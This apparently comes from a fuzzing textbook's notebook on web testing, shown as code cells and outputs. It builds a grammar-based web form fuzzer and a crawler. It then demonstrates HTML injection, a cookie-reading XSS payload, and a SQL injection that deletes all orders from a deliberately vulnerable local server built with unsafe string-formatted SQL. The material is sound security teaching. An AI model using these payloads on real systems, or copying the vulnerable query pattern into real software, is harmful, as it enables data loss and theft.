"```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /orer HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /ordr HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /orde HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order HTTP/1.1\" 500 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'item'\n\n```", "```py\nTraceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'item'\n\n```", "```py\nhtml_text = webbrowser(httpd_url)\nprint(html_text[html_text.find(\"<form\"):html_text.find(\"</form>\") + len(\"</form>\")]) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET / HTTP/1.1\" 200 -\n\n```", "```py\n<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n  <p>\n  Yes! Please send me at your earliest convenience\n  <select name=\"item\">\n  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n<option value=\"lockset\">One FuzzingBook Lock Set</option>\n\n  </select>\n  <br>\n  <table>\n  <tr><td>\n  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n  </td><td>\n  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n  </td></tr>\n  <tr><td>\n  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n  </td><td>\n  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n  </tr></tr>\n  </table>\n  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n</p>\n</form>\n\n```", "```py\nfrom [html.parser](https://docs.python.org/3/library/html.parser.html) import HTMLParser \n```", "```py\nclass FormHTMLParser(HTMLParser):\n  \"\"\"A parser for HTML forms\"\"\"\n\n    def reset(self) -> None:\n        super().reset()\n\n        # Form action  attribute (a URL)\n        self.action = \"\"\n\n        # Map of field name to type\n        # (or selection name to [option_1, option_2, ...])\n        self.fields: Dict[str, List[str]] = {}\n\n        # Stack of currently active selection names\n        self.select: List[str] = [] \n```", "```py\nclass FormHTMLParser(FormHTMLParser):\n    def handle_starttag(self, tag, attrs):\n        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}\n        # print(tag, attributes)\n\n        if tag == \"form\":\n            self.action = attributes.get(\"action\", \"\")\n\n        elif tag == \"select\" or tag == \"datalist\":\n            if \"name\" in attributes:\n                name = attributes[\"name\"]\n                self.fields[name] = []\n                self.select.append(name)\n            else:\n                self.select.append(None)\n\n        elif tag == \"option\" and \"multiple\" not in attributes:\n            current_select_name = self.select[-1]\n            if current_select_name is not None and \"value\" in attributes:\n                self.fields[current_select_name].append(attributes[\"value\"])\n\n        elif tag == \"input\" or tag == \"option\" or tag == \"textarea\":\n            if \"name\" in attributes:\n                name = attributes[\"name\"]\n                self.fields[name] = attributes.get(\"type\", \"text\")\n\n        elif tag == \"button\":\n            if \"name\" in attributes:\n                name = attributes[\"name\"]\n                self.fields[name] = [\"\"] \n```", "```py\nclass FormHTMLParser(FormHTMLParser):\n    def handle_endtag(self, tag):\n        if tag == \"select\":\n            self.select.pop() \n```", "```py\nclass HTMLGrammarMiner:\n  \"\"\"Mine a grammar from a HTML form\"\"\"\n\n    def __init__(self, html_text: str) -> None:\n  \"\"\"Constructor. `html_text` is the HTML string to parse.\"\"\"\n\n        html_parser = FormHTMLParser()\n        html_parser.feed(html_text)\n        self.fields = html_parser.fields\n        self.action = html_parser.action \n```", "```py\nhtml_miner = HTMLGrammarMiner(html_text)\nhtml_miner.action \n```", "```py\n'/order'\n\n```", "```py\nhtml_miner.fields \n```", "```py\n{'item': ['tshirt', 'drill', 'lockset'],\n 'name': 'text',\n 'email': 'email',\n 'city': 'text',\n 'zip': 'number',\n 'terms': 'checkbox',\n 'submit': 'submit'}\n\n```", "```py\nfrom [Grammars](Grammars.html) import crange, srange, new_symbol, unreachable_nonterminals, CGI_GRAMMAR, extend_grammar \n```", "```py\nclass HTMLGrammarMiner(HTMLGrammarMiner):\n    QUERY_GRAMMAR: Grammar = extend_grammar(CGI_GRAMMAR, {\n        \"<start>\": [\"<action>?<query>\"],\n\n        \"<text>\": [\"<string>\"],\n\n        \"<number>\": [\"<digits>\"],\n        \"<digits>\": [\"<digit>\", \"<digits><digit>\"],\n        \"<digit>\": crange('0', '9'),\n\n        \"<checkbox>\": [\"<_checkbox>\"],\n        \"<_checkbox>\": [\"on\", \"off\"],\n\n        \"<email>\": [\"<_email>\"],\n        \"<_email>\": [cgi_encode(\"<string>@<string>\", \"<>\")],\n\n        # Use a fixed password in case we need to repeat it\n        \"<password>\": [\"<_password>\"],\n        \"<_password>\": [\"abcABC.123\"],\n\n        # Stick to printable characters to avoid logging problems\n        \"<percent>\": [\"%<hexdigit-1><hexdigit>\"],\n        \"<hexdigit-1>\": srange(\"34567\"),\n\n        # Submissions:\n        \"<submit>\": [\"\"]\n    }) \n```", "```py\nclass HTMLGrammarMiner(HTMLGrammarMiner):\n    def mine_grammar(self) -> Grammar:\n  \"\"\"Extract a grammar from the given HTML text\"\"\"\n\n        grammar: Grammar = extend_grammar(self.QUERY_GRAMMAR)\n        grammar[\"<action>\"] = [self.action]\n\n        query = \"\"\n        for field in self.fields:\n            field_symbol = new_symbol(grammar, \"<\" + field + \">\")\n            field_type = self.fields[field]\n\n            if query != \"\":\n                query += \"&\"\n            query += field_symbol\n\n            if isinstance(field_type, str):\n                field_type_symbol = \"<\" + field_type + \">\"\n                grammar[field_symbol] = [field + \"=\" + field_type_symbol]\n                if field_type_symbol not in grammar:\n                    # Unknown type\n                    grammar[field_type_symbol] = [\"<text>\"]\n            else:\n                # List of values\n                value_symbol = new_symbol(grammar, \"<\" + field + \"-value>\")\n                grammar[field_symbol] = [field + \"=\" + value_symbol]\n                grammar[value_symbol] = field_type\n\n        grammar[\"<query>\"] = [query]\n\n        # Remove unused parts\n        for nonterminal in unreachable_nonterminals(grammar):\n            del grammar[nonterminal]\n\n        assert is_valid_grammar(grammar)\n\n        return grammar \n```", "```py\nhtml_miner = HTMLGrammarMiner(html_text)\ngrammar = html_miner.mine_grammar()\ngrammar \n```", "```py\n{'<start>': ['<action>?<query>'],\n '<string>': ['<letter>', '<letter><string>'],\n '<letter>': ['<plus>', '<percent>', '<other>'],\n '<plus>': ['+'],\n '<percent>': ['%<hexdigit-1><hexdigit>'],\n '<hexdigit>': ['0',\n  '1',\n  '2',\n  '3',\n  '4',\n  '5',\n  '6',\n  '7',\n  '8',\n  '9',\n  'a',\n  'b',\n  'c',\n  'd',\n  'e',\n  'f'],\n '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'],\n '<text>': ['<string>'],\n '<number>': ['<digits>'],\n '<digits>': ['<digit>', '<digits><digit>'],\n '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],\n '<checkbox>': ['<_checkbox>'],\n '<_checkbox>': ['on', 'off'],\n '<email>': ['<_email>'],\n '<_email>': ['<string>%40<string>'],\n '<hexdigit-1>': ['3', '4', '5', '6', '7'],\n '<submit>': [''],\n '<action>': ['/order'],\n '<item>': ['item=<item-value>'],\n '<item-value>': ['tshirt', 'drill', 'lockset'],\n '<name>': ['name=<text>'],\n '<email-1>': ['email=<email>'],\n '<city>': ['city=<text>'],\n '<zip>': ['zip=<number>'],\n '<terms>': ['terms=<checkbox>'],\n '<submit-1>': ['submit=<submit>'],\n '<query>': ['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']}\n\n```", "```py\ngrammar[\"<start>\"] \n```", "```py\n['<action>?<query>']\n\n```", "```py\ngrammar[\"<action>\"] \n```", "```py\n['/order']\n\n```", "```py\ngrammar[\"<query>\"] \n```", "```py\n['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']\n\n```", "```py\ngrammar[\"<zip>\"] \n```", "```py\n['zip=<number>']\n\n```", "```py\ngrammar[\"<terms>\"] \n```", "```py\n['terms=<checkbox>']\n\n```", "```py\norder_fuzzer = GrammarFuzzer(grammar)\n[order_fuzzer.fuzz() for i in range(3)] \n```", "```py\n['/order?item=drill&name=++%61&email=%6e%40b++&city=0&zip=88&terms=on&submit=',\n '/order?item=tshirt&name=%3f&email=21+%40+&city=++&zip=4&terms=off&submit=',\n '/order?item=drill&name=2&email=%62%40++%4d1++_%77&city=e%5d&zip=1&terms=on&submit=']\n\n```", "```py\nHTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz()))) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('drill', ' ', '5F @p   a ', 'cdb', '3230')\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?item=drill&name=+&email=5F+%40p+++a+&city=cdb&zip=3230&terms=on&submit= HTTP/1.1\" 200 -\n\n```", "```py\nclass WebFormFuzzer(GrammarFuzzer):\n  \"\"\"A Fuzzer for Web forms\"\"\"\n\n    def __init__(self, url: str, *,\n                 grammar_miner_class: Optional[type] = None,\n                 **grammar_fuzzer_options):\n  \"\"\"Constructor.\n `url` - the URL of the Web form to fuzz.\n `grammar_miner_class` - the class of the grammar miner\n to use (default: `HTMLGrammarMiner`)\n Other keyword arguments are passed to the `GrammarFuzzer` constructor\n \"\"\"\n\n        if grammar_miner_class is None:\n            grammar_miner_class = HTMLGrammarMiner\n        self.grammar_miner_class = grammar_miner_class\n\n        # We first extract the HTML form and its grammar...\n        html_text = self.get_html(url)\n        grammar = self.get_grammar(html_text)\n\n        # ... and then initialize the `GrammarFuzzer` superclass with it\n        super().__init__(grammar, **grammar_fuzzer_options)\n\n    def get_html(self, url: str):\n  \"\"\"Retrieve the HTML text for the given URL `url`.\n To be overloaded in subclasses.\"\"\"\n        return requests.get(url).text\n\n    def get_grammar(self, html_text: str):\n  \"\"\"Obtain the grammar for the given HTML `html_text`.\n To be overloaded in subclasses.\"\"\"\n        grammar_miner = self.grammar_miner_class(html_text)\n        return grammar_miner.mine_grammar() \n```", "```py\nweb_form_fuzzer = WebFormFuzzer(httpd_url)\nweb_form_fuzzer.fuzz() \n```", "```py\n'/order?item=lockset&name=%6b+&email=+%40b5&city=%7e+5&zip=65&terms=on&submit='\n\n```", "```py\nweb_form_runner = WebRunner(httpd_url)\nweb_form_fuzzer.runs(web_form_runner, 10) \n```", "```py\n[('http://127.0.0.1:8800/order?item=drill&name=+%6d&email=%40%400&city=%64&zip=9&terms=on&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=lockset&name=++&email=%63%40d&city=_&zip=6&terms=on&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=lockset&name=+&email=d%40_-&city=2++0&zip=1040&terms=off&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=tshirt&name=%4bb&email=%6d%40+&city=%7a%79+&zip=13&terms=off&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=lockset&name=d&email=%55+%40%74&city=+&zip=4&terms=on&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=tshirt&name=_+2&email=1++%40+&city=+&zip=30&terms=on&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=tshirt&name=+&email=a-%40+&city=+%57&zip=2&terms=on&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=lockset&name=%56&email=++%40a%55ee%44&city=+&zip=01&terms=off&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=tshirt&name=%6fc&email=++%40+&city=a&zip=25&terms=off&submit=',\n  'PASS'),\n ('http://127.0.0.1:8800/order?item=drill&name=55&email=3%3e%40%405&city=%4c&zip=0&terms=off&submit=',\n  'PASS')]\n\n```", "```py\nclear_httpd_messages() \n```", "```py\n<a href=\"<link>\"> \n```", "```py\nclass LinkHTMLParser(HTMLParser):\n  \"\"\"Parse all links found in a HTML page\"\"\"\n\n    def reset(self):\n        super().reset()\n        self.links = []\n\n    def handle_starttag(self, tag, attrs):\n        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}\n\n        if tag == \"a\" and \"href\" in attributes:\n            # print(\"Found:\", tag, attributes)\n            self.links.append(attributes[\"href\"]) \n```", "```py\nfrom [collections](https://docs.python.org/3/library/collections.html) import deque\nimport [urllib.robotparser](https://docs.python.org/3/library/urllib.robotparser.html) \n```", "```py\ndef crawl(url, max_pages: Union[int, float] = 1, same_host: bool = True):\n  \"\"\"Return the list of linked URLs from the given URL.\n `max_pages` - the maximum number of pages accessed.\n `same_host` - if True (default), stay on the same host\"\"\"\n\n    pages = deque([(url, \"<param>\")])\n    urls_seen = set()\n\n    rp = urllib.robotparser.RobotFileParser()\n    rp.set_url(urljoin(url, \"/robots.txt\"))\n    rp.read()\n\n    while len(pages) > 0 and max_pages > 0:\n        page, referrer = pages.popleft()\n        if not rp.can_fetch(\"*\", page):\n            # Disallowed by robots.txt\n            continue\n\n        r = requests.get(page)\n        max_pages -= 1\n\n        if r.status_code != HTTPStatus.OK:\n            print(\"Error \" + repr(r.status_code) + \": \" + page,\n                  \"(referenced from \" + referrer + \")\",\n                  file=sys.stderr)\n            continue\n\n        content_type = r.headers[\"content-type\"]\n        if not content_type.startswith(\"text/html\"):\n            continue\n\n        parser = LinkHTMLParser()\n        parser.feed(r.text)\n\n        for link in parser.links:\n            target_url = urljoin(page, link)\n            if same_host and urlsplit(\n                    target_url).hostname != urlsplit(url).hostname:\n                # Different host\n                continue\n\n            if urlsplit(target_url).fragment != \"\":\n                # Ignore #fragments\n                continue\n\n            if target_url not in urls_seen:\n                pages.append((target_url, page))\n                urls_seen.add(target_url)\n                yield target_url\n\n        if page not in urls_seen:\n            urls_seen.add(page)\n            yield page \n```", "```py\nfor url in crawl(httpd_url):\n    print_httpd_messages()\n    print_url(url) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /robots.txt HTTP/1.1\" 404 -\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET / HTTP/1.1\" 200 -\n\n```", "```py\nhttp://127.0.0.1:8800/terms\n```", "```py\nhttp://127.0.0.1:8800\n```", "```py\nfor url in crawl(\"https://www.fuzzingbook.org/\"):\n    print_url(url) \n```", "```py\nhttps://www.fuzzingbook.org/\n```", "```py\nhttps://www.fuzzingbook.org/html/00_Table_of_Contents.html\n```", "```py\nhttps://www.fuzzingbook.org/html/01_Intro.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Tours.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Intro_Testing.html\n```", "```py\nhttps://www.fuzzingbook.org/html/02_Lexical_Fuzzing.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Fuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Coverage.html\n```", "```py\nhttps://www.fuzzingbook.org/html/MutationFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/GreyboxFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/SearchBasedFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/MutationAnalysis.html\n```", "```py\nhttps://www.fuzzingbook.org/html/03_Syntactical_Fuzzing.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Grammars.html\n```", "```py\nhttps://www.fuzzingbook.org/html/GrammarFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/GrammarCoverageFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Parser.html\n```", "```py\nhttps://www.fuzzingbook.org/html/ProbabilisticGrammarFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/GeneratorGrammarFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/GreyboxGrammarFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Reducer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/04_Semantical_Fuzzing.html\n```", "```py\nhttps://www.fuzzingbook.org/html/FuzzingWithConstraints.html\n```", "```py\nhttps://www.fuzzingbook.org/html/GrammarMiner.html\n```", "```py\nhttps://www.fuzzingbook.org/html/InformationFlow.html\n```", "```py\nhttps://www.fuzzingbook.org/html/ConcolicFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/SymbolicFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/DynamicInvariants.html\n```", "```py\nhttps://www.fuzzingbook.org/html/05_Domain-Specific_Fuzzing.html\n```", "```py\nhttps://www.fuzzingbook.org/html/ConfigurationFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/APIFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Carver.html\n```", "```py\nhttps://www.fuzzingbook.org/html/PythonFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/WebFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/GUIFuzzer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/06_Managing_Fuzzing.html\n```", "```py\nhttps://www.fuzzingbook.org/html/FuzzingInTheLarge.html\n```", "```py\nhttps://www.fuzzingbook.org/html/WhenToStopFuzzing.html\n```", "```py\nhttps://www.fuzzingbook.org/html/99_Appendices.html\n```", "```py\nhttps://www.fuzzingbook.org/html/AcademicPrototyping.html\n```", "```py\nhttps://www.fuzzingbook.org/html/PrototypingWithPython.html\n```", "```py\nhttps://www.fuzzingbook.org/html/ExpectError.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Timer.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Timeout.html\n```", "```py\nhttps://www.fuzzingbook.org/html/ClassDiagram.html\n```", "```py\nhttps://www.fuzzingbook.org/html/RailroadDiagrams.html\n```", "```py\nhttps://www.fuzzingbook.org/html/ControlFlow.html\n```", "```py\nhttps://www.fuzzingbook.org/html/00_Index.html\n```", "```py\nhttps://www.fuzzingbook.org/dist/fuzzingbook-code.zip\n```", "```py\nhttps://www.fuzzingbook.org/dist/fuzzingbook-notebooks.zip\n```", "```py\nhttps://www.fuzzingbook.org/html/ReleaseNotes.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Importing.html\n```", "```py\nhttps://www.fuzzingbook.org/slides/Fuzzer.slides.html\n```", "```py\nhttps://www.fuzzingbook.org/html/Guide_for_Authors.html\n```", "```py\nfor url in crawl(httpd_url, max_pages=float('inf')):\n    web_form_fuzzer = WebFormFuzzer(url)\n    web_form_runner = WebRunner(url)\n    print(web_form_fuzzer.run(web_form_runner)) \n```", "```py\n('http://127.0.0.1:8800/terms', 'PASS')\n('http://127.0.0.1:8800/order?item=tshirt&name=+&email=b+%742%40+&city=%45%39&zip=54&terms=on&submit=', 'PASS')\n('http://127.0.0.1:8800/order?item=drill&name=%52-&email=e%40%3f&city=+&zip=5&terms=on&submit=', 'PASS')\n\n```", "```py\nclear_httpd_messages() \n```", "```py\nfrom [Grammars](Grammars.html) import extend_grammar \n```", "```py\nORDER_GRAMMAR_WITH_HTML_INJECTION: Grammar = extend_grammar(ORDER_GRAMMAR, {\n    \"<name>\": [cgi_encode('''\n Jane Doe<p>\n <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\n </p>\n ''')],\n}) \n```", "```py\nhtml_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_HTML_INJECTION)\norder_with_injected_html = html_injection_fuzzer.fuzz()\norder_with_injected_html \n```", "```py\n'/order?item=drill&name=%0a++++Jane+Doe%3cp%3e%0a++++%3cstrong%3e%3ca+href%3d%22www.lots.of.malware%22%3eClick+here+for+cute+cat+pictures!%3c%2fa%3e%3c%2fstrong%3e%0a++++%3c%2fp%3e%0a++++&email=j_smith%40example.com&city=Seattle&zip=02805'\n\n```", "```py\nHTML(webbrowser(urljoin(httpd_url, order_with_injected_html))) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('drill', '\n    Jane Doe\n    **[Click here for cute cat pictures!](www.lots.of.malware)**\n\n    ', 'j_smith@example.com', 'Seattle', '02805')\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?item=drill&name=%0A++++Jane+Doe%3Cp%3E%0A++++%3Cstrong%3E%3Ca+href%3D%22www.lots.of.malware%22%3EClick+here+for+cute+cat+pictures!%3C%2Fa%3E%3C%2Fstrong%3E%0A++++%3C%2Fp%3E%0A++++&email=j_smith%40example.com&city=Seattle&zip=02805 HTTP/1.1\" 200 -\n\n```", "```py\nprint(db.execute(\"SELECT * FROM orders WHERE name LIKE '%<%'\").fetchall()) \n```", "```py\n[('drill', '\\n    Jane Doe<p>\\n    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\\n    </p>\\n    ', 'j_smith@example.com', 'Seattle', '02805')]\n\n```", "```py\nORDER_GRAMMAR_WITH_XSS_INJECTION: Grammar = extend_grammar(ORDER_GRAMMAR, {\n    \"<name>\": [cgi_encode('Jane Doe' +\n                          '<script>' +\n                          'document.title = document.cookie.substring(0, 10);' +\n                          '</script>')\n               ],\n}) \n```", "```py\nxss_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_XSS_INJECTION)\norder_with_injected_xss = xss_injection_fuzzer.fuzz()\norder_with_injected_xss \n```", "```py\n'/order?item=lockset&name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&email=j.doe%40example.com&city=Seattle&zip=34506'\n\n```", "```py\nurl_with_injected_xss = urljoin(httpd_url, order_with_injected_xss)\nurl_with_injected_xss \n```", "```py\n'http://127.0.0.1:8800/order?item=lockset&name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&email=j.doe%40example.com&city=Seattle&zip=34506'\n\n```", "```py\nHTML(webbrowser(url_with_injected_xss, mute=True)) \n```", "```py\nHTML('<script>document.title = \"Jupyter\"</script>') \n```", "```py\nsql_command = (\"INSERT INTO orders \" +\n    \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)) \n```", "```py\nvalues: Dict[str, str] = {\n    \"item\": \"tshirt\",\n    \"name\": \"Jane Doe\",\n    \"email\": \"j.doe@example.com\",\n    \"city\": \"Seattle\",\n    \"zip\": \"98104\"\n} \n```", "```py\nsql_command = (\"INSERT INTO orders \" +\n               \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))\nsql_command \n```", "```py\n\"INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'j.doe@example.com', 'Seattle', '98104')\"\n\n```", "```py\nvalues[\"name\"] = \"Jane', 'x', 'x', 'x'); DELETE FROM orders; -- \" \n```", "```py\nsql_command = (\"INSERT INTO orders \" +\n               \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))\nsql_command \n```", "```py\n\"INSERT INTO orders VALUES ('tshirt', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; -- ', 'j.doe@example.com', 'Seattle', '98104')\"\n\n```", "```py\nfrom [Grammars](Grammars.html) import extend_grammar \n```", "```py\nORDER_GRAMMAR_WITH_SQL_INJECTION = extend_grammar(ORDER_GRAMMAR, {\n    \"<name>\": [cgi_encode(\"Jane', 'x', 'x', 'x'); DELETE FROM orders; --\")],\n}) \n```", "```py\nsql_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_SQL_INJECTION)\norder_with_injected_sql = sql_injection_fuzzer.fuzz()\norder_with_injected_sql \n```", "```py\n\"/order?item=drill&name=Jane',+'x',+'x',+'x')%3b+DELETE+FROM+orders%3b+--&email=j.doe%40example.com&city=New+York&zip=14083\"\n\n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104'), ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631'), ('drill', 'Jane Doe', 'j.doe@example.com', '', '45732'), ('drill', 'Jane Doe', 'j,doe@example.com', 'Seattle', '45732'), ('drill', ' ', '5F @p   a ', 'cdb', '3230'), ('drill', ' m', '@@0', 'd', '9'), ('lockset', '  ', 'c@d', '_', '6'), ('lockset', ' ', 'd@_-', '2  0', '1040'), ('tshirt', 'Kb', 'm@ ', 'zy ', '13'), ('lockset', 'd', 'U @t', ' ', '4'), ('tshirt', '_ 2', '1  @ ', ' ', '30'), ('tshirt', ' ', 'a-@ ', ' W', '2'), ('lockset', 'V', '  @aUeeD', ' ', '01'), ('tshirt', 'oc', '  @ ', 'a', '25'), ('drill', '55', '3>@@5', 'L', '0'), ('tshirt', ' ', 'b t2@ ', 'E9', '54'), ('drill', 'R-', 'e@?', ' ', '5'), ('drill', '\\n    Jane Doe<p>\\n    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\\n    </p>\\n    ', 'j_smith@example.com', 'Seattle', '02805'), ('lockset', 'Jane Doe<script>document.title = document.cookie.substring(0, 10);</script>', 'j.doe@example.com', 'Seattle', '34506')]\n\n```", "```py\ncontents = webbrowser(urljoin(httpd_url, order_with_injected_sql)) \n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('drill', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; --', 'j.doe@example.com', 'New York', '14083')\n\n```", "```py\n127.0.0.1 - - [16/Jan/2025 11:12:26] \"GET /order?item=drill&name=Jane',+'x',+'x',+'x')%3B+DELETE+FROM+orders%3B+--&email=j.doe%40example.com&city=New+York&zip=14083 HTTP/1.1\" 200 -\n\n```", "```py\nprint(db.execute(\"SELECT * FROM orders\").fetchall()) \n```", "```py\n[]\n\n```", "```py\nanswer = webbrowser(urljoin(httpd_url, \"/order\"), mute=True) \n```", "```py\nHTML(answer) \n```", "```py\nTraceback (most recent call last):\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py\", line 8, in do_GET\n    self.handle_order()\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py\", line 4, in handle_order\n    self.store_order(values)\n  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py\", line 5, in store_order\n    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nKeyError: 'item'\n\n```", "```py\nclass SQLInjectionGrammarMiner(HTMLGrammarMiner):\n  \"\"\"Demonstration of an automatic SQL Injection attack grammar miner\"\"\"\n\n    # Some common attack schemes\n    ATTACKS: List[str] = [\n        \"<string>' <sql-values>); <sql-payload>; <sql-comment>\",\n        \"<string>' <sql-comment>\",\n        \"' OR 1=1<sql-comment>'\",\n        \"<number> OR 1=1\",\n    ]\n\n    def __init__(self, html_text: str, sql_payload: str):\n  \"\"\"Constructor.\n `html_text` - the HTML form to be attacked\n `sql_payload` - the SQL command to be executed\n \"\"\"\n        super().__init__(html_text)\n\n        self.QUERY_GRAMMAR = extend_grammar(self.QUERY_GRAMMAR, {\n            \"<text>\": [\"<string>\", \"<sql-injection-attack>\"],\n            \"<number>\": [\"<digits>\", \"<sql-injection-attack>\"],\n            \"<checkbox>\": [\"<_checkbox>\", \"<sql-injection-attack>\"],\n            \"<email>\": [\"<_email>\", \"<sql-injection-attack>\"],\n            \"<sql-injection-attack>\": [\n                cgi_encode(attack, \"<->\") for attack in self.ATTACKS\n            ],\n            \"<sql-values>\": [\"\", cgi_encode(\"<sql-values>, '<string>'\", \"<->\")],\n            \"<sql-payload>\": [cgi_encode(sql_payload)],\n            \"<sql-comment>\": [\"--\", \"#\"],\n        }) \n```", 